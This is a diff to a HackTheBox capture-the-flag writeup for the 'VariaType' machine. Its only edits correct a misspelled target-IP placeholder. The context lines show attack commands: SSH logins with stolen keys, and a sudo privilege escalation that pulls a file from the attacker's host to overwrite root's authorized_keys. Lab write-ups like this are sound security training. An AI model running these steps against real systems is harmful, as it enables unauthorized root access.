@@ -1,6 +1,6 @@
 # VariaType (Avatar) - HackTheBox CTF Writeup
 
-**Target IP:** <Tareget_IP>  
+**Target IP:** <Target_IP>  
 **Difficulty:** Medium  
 **Flags:**
 - user.txt: `<REDACTED_USER_FLAG>`
@@ -22,7 +22,7 @@
 
 ### Nmap Scan
 ```bash
-nmap -sC -sV -oN nmap.txt <Tareget_IP>
+nmap -sC -sV -oN nmap.txt <Target_IP>
 ```
 
 **Results:**
@@ -35,7 +35,7 @@ PORT   STATE SERVICE VERSION
 ### Host Discovery
 ```bash
 # Add to /etc/hosts
-echo "<Tareget_IP> variatype.htb portal.variatype.htb" | sudo tee -a /etc/hosts
+echo "<Target_IP> variatype.htb portal.variatype.htb" | sudo tee -a /etc/hosts
 ```
 
 ### Git Repository Exposure
@@ -224,7 +224,7 @@ echo "Waiting for cron..."
 sleep 60
 
 # SSH as steve
-ssh -o StrictHostKeyChecking=no -i steve_key steve@<Tareget_IP> "whoami && cat ~/user.txt"
+ssh -o StrictHostKeyChecking=no -i steve_key steve@<Target_IP> "whoami && cat ~/user.txt"
 ```
 
 **user.txt:** `<REDACTED_USER_FLAG>`
@@ -235,7 +235,7 @@ ssh -o StrictHostKeyChecking=no -i steve_key steve@<Tareget_IP> "whoami && cat ~
 
 ### Step 10: Check Sudo Permissions
 ```bash
-ssh -o StrictHostKeyChecking=no -i steve_key steve@<Tareget_IP> "sudo -l"
+ssh -o StrictHostKeyChecking=no -i steve_key steve@<Target_IP> "sudo -l"
 ```
 
 **Output:**
@@ -275,7 +275,7 @@ Run exploit:
 python3 serve_root_key.py &
 
 # Exploit with URL-encoded absolute path
-ssh -o StrictHostKeyChecking=no -i steve_key steve@<Tareget_IP> \
+ssh -o StrictHostKeyChecking=no -i steve_key steve@<Target_IP> \
   "sudo /usr/bin/python3 /opt/font-tools/install_validator.py 'http://<Your_IP_Address>:8889/%2Froot%2F.ssh%2Fauthorized_keys'"
 ```
 
@@ -287,7 +287,7 @@ ssh -o StrictHostKeyChecking=no -i steve_key steve@<Tareget_IP> \
 
 ### Step 12: SSH as root
 ```bash
-ssh -o StrictHostKeyChecking=no -i root_key root@<Tareget_IP> "whoami && cat /root/root.txt"
+ssh -o StrictHostKeyChecking=no -i root_key root@<Target_IP> "whoami && cat /root/root.txt"
 ```
 
 **root.txt:** `<REDACTED_ROOT_FLAG>`
@@ -302,11 +302,11 @@ ssh -o StrictHostKeyChecking=no -i root_key root@<Tareget_IP> "whoami && cat /ro
 #!/bin/bash
 
 # VariaType (Avatar) - HackTheBox Auto-Exploit
-# Target: <Tareget_IP>
+# Target: <Target_IP>
 
 set -e
 
-RHOST="<Tareget_IP>"
+RHOST="<Target_IP>"
 LHOST="<Your_IP_Address>"
 
 echo "[*] VariaType Auto-Exploit"
